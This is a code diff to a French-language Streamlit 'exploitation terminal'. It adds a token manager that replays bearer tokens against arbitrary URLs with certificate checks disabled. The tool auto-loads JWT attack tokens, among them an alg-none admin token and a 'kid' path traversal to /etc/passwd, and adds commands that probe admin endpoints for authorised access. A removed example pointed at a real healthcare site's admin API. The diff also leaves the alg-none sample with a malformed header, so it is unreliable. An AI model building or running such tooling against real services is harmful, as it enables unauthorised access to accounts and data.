@@ -1,4 +1,4 @@
-# poc_console.py (VERSION ULTRA-COMPLÈTE CORRIGÉE)
+# poc_console.py (VERSION ULTRA-COMPLÈTE AVEC GESTION DE TOKENS)
 import streamlit as st
 from datetime import datetime
 import time
@@ -135,12 +135,70 @@ class JWTAnalyzer:
     def generate_test_jwts():
         """Génère des tokens JWT de test pour différentes vulnérabilités"""
         test_jwts = {
-            'none_alg': 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',
+            'none_alg': 'eyJhbGciOiJub25eIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',
             'weak_secret': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0cm9waWMifQ.',
             'admin_claim': 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',
             'kid_injection': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJ0cm9waWMifQ.'
         }
         return test_jwts
+
+# ===============================================================================
+#                          SYSTÈME DE GESTION DE TOKENS OPTIMISÉ
+# ===============================================================================
+
+class TokenHunter:
+    """Gestionnaire performant de tokens"""
+    
+    def __init__(self):
+        self.found_tokens = {}
+        self.token_counter = 0
+    
+    def add_token(self, token, name="", token_type="custom", source=""):
+        """Ajoute un token à la collection"""
+        self.token_counter += 1
+        token_id = f"token_{self.token_counter}"
+        
+        self.found_tokens[token_id] = {
+            'id': token_id,
+            'token': token,
+            'name': name or f"Token_{self.token_counter}",
+            'type': token_type,
+            'source': source,
+            'added_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        return token_id
+    
+    def list_tokens(self):
+        """Retourne tous les tokens"""
+        return self.found_tokens
+    
+    def get_token(self, token_id):
+        """Récupère un token spécifique"""
+        return self.found_tokens.get(token_id)
+    
+    def use_token_request(self, token_id, url, method='GET', timeout=10):
+        """Utilise un token pour une requête HTTP"""
+        token_data = self.get_token(token_id)
+        if not token_data:
+            return None, "Token non trouvé"
+        
+        headers = {
+            'User-Agent': 'TROPIC-TokenHunter/1.0',
+            'Authorization': f'Bearer {token_data["token"]}'
+        }
+        
+        try:
+            if method.upper() == 'GET':
+                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
+            elif method.upper() == 'POST':
+                response = requests.post(url, headers=headers, timeout=timeout, verify=False)
+            else:
+                response = requests.request(method, url, headers=headers, timeout=timeout, verify=False)
+            
+            return response, None
+            
+        except Exception as e:
+            return None, f"Erreur requête: {str(e)}"
 
 # ===============================================================================
 #                          FONCTIONS DE BASE (COMMANDES SIMPLES)
@@ -226,7 +284,7 @@ def _summarize_body(body, max_chars=1000):
 
 def render_poc_console(target_domain: str, user_config: dict):
     """
-    Console PoC ULTRA-COMPLÈTE avec TOUTES les commandes
+    Console PoC ULTRA-COMPLÈTE avec TOUTES les commandes + Gestion de Tokens
     """
 
     st.markdown("### 💻 Console PoC / Terminal d'Exploitation (ULTRA-COMPLÈTE)")
@@ -235,6 +293,12 @@ def render_poc_console(target_domain: str, user_config: dict):
     # Initialisation
     payload_gen = AdvancedPayloadGenerator(target_domain)
     jwt_analyzer = JWTAnalyzer()
+    token_hunter = TokenHunter()
+    
+    # Ajouter automatiquement les tokens JWT de test
+    test_jwts = jwt_analyzer.generate_test_jwts()
+    for vuln_type, token in test_jwts.items():
+        token_hunter.add_token(token, f"JWT_{vuln_type}", "jwt_test", "auto_generated")
     
     # Configuration
     timeout_config = user_config.get('timeout', 10)
@@ -284,6 +348,13 @@ def render_poc_console(target_domain: str, user_config: dict):
         - `decode:jwt:token` - Décode un token
         - `generate:jwt` - Génère des tokens test
 
+        **🔑 COMMANDES TOKENS :**
+        - `list:tokens` - Liste tous les tokens
+        - `use:token:token_id` - Utilise un token (test générique)
+        - `test:token:token_id:url` - Test un token sur une URL spécifique
+        - `add:token:nom:valeur` - Ajoute un token personnalisé
+        - `decode:token:token_id` - Décode un token JWT
+
         **🕸️ COMMANDES GRAPHQL :**
         - `scan:graphql:url` - Test introspection
         - `introspect:graphql:url` - Introspection complète
@@ -298,7 +369,7 @@ def render_poc_console(target_domain: str, user_config: dict):
     with st.form(key=form_key, clear_on_submit=False):
         cmd_input = st.text_input("Entrer commande PoC", 
                                  value=st.session_state.get('poc_current_shell_command_input', ""),
-                                 placeholder="Ex: https://admin.doctolib.fr/api/v2/config")
+                                 placeholder="Ex: list:tokens, use:token:token_1, https://example.com/api")
         submit = st.form_submit_button("▶️ Exécuter")
 
         if submit:
@@ -460,6 +531,124 @@ def render_poc_console(target_domain: str, user_config: dict):
                 for vuln_type, token in test_jwts.items():
                     _append_history(f"  {vuln_type}: {token}")
                 st.session_state['poc_last_status'] = "JWT-GENERATED"
+                st.session_state['poc_last_time'] = timestamp
+                _safe_rerun()
+                return
+
+            # 🔑 COMMANDES TOKENS
+            elif cmd.lower() == 'list:tokens':
+                _append_history("$ list:tokens")
+                tokens = token_hunter.list_tokens()
+                
+                if not tokens:
+                    _append_history("📭 [NO-TOKENS] Aucun token enregistré")
+                    st.session_state['poc_last_status'] = "NO-TOKENS"
+                else:
+                    _append_history(f"📋 [TOKENS-LIST] {len(tokens)} tokens disponibles:")
+                    for token_id, token_data in tokens.items():
+                        _append_history(f"  🔑 {token_id}: {token_data['name']} ({token_data['type']})")
+                    st.session_state['poc_last_status'] = f"TOKENS-LIST-{len(tokens)}"
+                st.session_state['poc_last_time'] = timestamp
+                _safe_rerun()
+                return
+
+            elif cmd.lower().startswith('use:token:'):
+                parts = cmd.split(':', 2)
+                if len(parts) == 3:
+                    token_id = parts[2].strip()
+                    _append_history(f"$ use:token:{token_id}")
+                    
+                    # URL générique pour démonstration
+                    test_url = "https://example.com/api/admin"
+                    _append_history(f"🔧 Utilisation sur: {test_url}")
+                    
+                    response, error = token_hunter.use_token_request(token_id, test_url, 'GET', timeout_config)
+                    
+                    if error:
+                        _append_history(f"[TOKEN-ERROR] {error}")
+                        st.session_state['poc_last_status'] = "TOKEN-ERROR"
+                    else:
+                        token_data = token_hunter.get_token(token_id)
+                        _append_history(f"✅ [TOKEN-USED] HTTP {response.status_code}")
+                        _append_history(f"   Token: {token_data['name']}")
+                        st.session_state['poc_last_status'] = f"TOKEN-{response.status_code}"
+                else:
+                    _append_history("[ERROR] Format: use:token:token_id")
+                    st.session_state['poc_last_status'] = "TOKEN-FORMAT-ERROR"
+                st.session_state['poc_last_time'] = timestamp
+                _safe_rerun()
+                return
+
+            elif cmd.lower().startswith('add:token:'):
+                parts = cmd.split(':', 2)
+                if len(parts) == 3:
+                    token_name, token_value = parts[1], parts[2]
+                    _append_history(f"$ add:token:{token_name}:{token_value[:50]}...")
+                    
+                    token_id = token_hunter.add_token(token_value, token_name, "custom", "manual")
+                    _append_history(f"✅ [TOKEN-ADDED] {token_id} - {token_name}")
+                    st.session_state['poc_last_status'] = f"TOKEN-ADDED-{token_id}"
+                else:
+                    _append_history("[ERROR] Format: add:token:nom:token_value")
+                    st.session_state['poc_last_status'] = "TOKEN-ADD-ERROR"
+                st.session_state['poc_last_time'] = timestamp
+                _safe_rerun()
+                return
+
+            elif cmd.lower().startswith('test:token:'):
+                parts = cmd.split(':', 3)
+                if len(parts) == 4:
+                    token_id, test_url = parts[2], parts[3]
+                    _append_history(f"$ test:token:{token_id}:{test_url}")
+                    
+                    response, error = token_hunter.use_token_request(token_id, test_url, 'GET', timeout_config)
+                    
+                    if error:
+                        _append_history(f"[TOKEN-TEST-ERROR] {error}")
+                        st.session_state['poc_last_status'] = "TOKEN-TEST-ERROR"
+                    else:
+                        token_data = token_hunter.get_token(token_id)
+                        _append_history(f"🎯 [TOKEN-TEST] HTTP {response.status_code}")
+                        _append_history(f"   Token: {token_data['name']}")
+                        
+                        if response.status_code == 200:
+                            _append_history("   ✅ ACCÈS AUTORISÉ")
+                        snippet = _summarize_body(response.text)
+                        _append_history(f"   Réponse: {snippet}")
+                        
+                        st.session_state['poc_last_status'] = f"TOKEN-TEST-{response.status_code}"
+                else:
+                    _append_history("[ERROR] Format: test:token:token_id:url")
+                    st.session_state['poc_last_status'] = "TOKEN-TEST-FORMAT-ERROR"
+                st.session_state['poc_last_time'] = timestamp
+                _safe_rerun()
+                return
+
+            elif cmd.lower().startswith('decode:token:'):
+                token_id = cmd[len('decode:token:'):].strip()
+                _append_history(f"$ decode:token:{token_id}")
+                
+                token_data = token_hunter.get_token(token_id)
+                if not token_data:
+                    _append_history("[ERROR] Token non trouvé")
+                    st.session_state['poc_last_status'] = "TOKEN-NOT-FOUND"
+                else:
+                    token = token_data['token']
+                    # Essayer de décoder si c'est un JWT
+                    if token.startswith('eyJ'):
+                        result, error = jwt_analyzer.decode_jwt(token)
+                        if error:
+                            _append_history(f"[DECODE-ERROR] {error}")
+                            st.session_state['poc_last_status'] = "TOKEN-DECODE-ERROR"
+                        else:
+                            _append_history(f"🔓 [TOKEN-DECODED] {token_data['name']}:")
+                            _append_history(f"   Header: {json.dumps(result['header'], indent=2)}")
+                            _append_history(f"   Payload: {json.dumps(result['payload'], indent=2)}")
+                            st.session_state['poc_last_status'] = "TOKEN-DECODED"
+                    else:
+                        _append_history(f"🔍 [TOKEN-RAW] {token_data['name']}:")
+                        _append_history(f"   Token: {token[:100]}...")
+                        st.session_state['poc_last_status'] = "TOKEN-RAW"
                 st.session_state['poc_last_time'] = timestamp
                 _safe_rerun()
                 return
@@ -643,6 +832,7 @@ def render_poc_console(target_domain: str, user_config: dict):
                 _append_history("  probe:url, get:url, post:url")
                 _append_history("  scan:xss:url, scan:sqli:url, scan:api:url")
                 _append_history("  decode:jwt:token, generate:jwt")
+                _append_history("  list:tokens, use:token:token_id, test:token:token_id:url")
                 _append_history("  tech:detect:url, fuzz:endpoints:url")
                 st.session_state['poc_last_status'] = "400 (unknown command)"
                 st.session_state['poc_last_time'] = timestamp
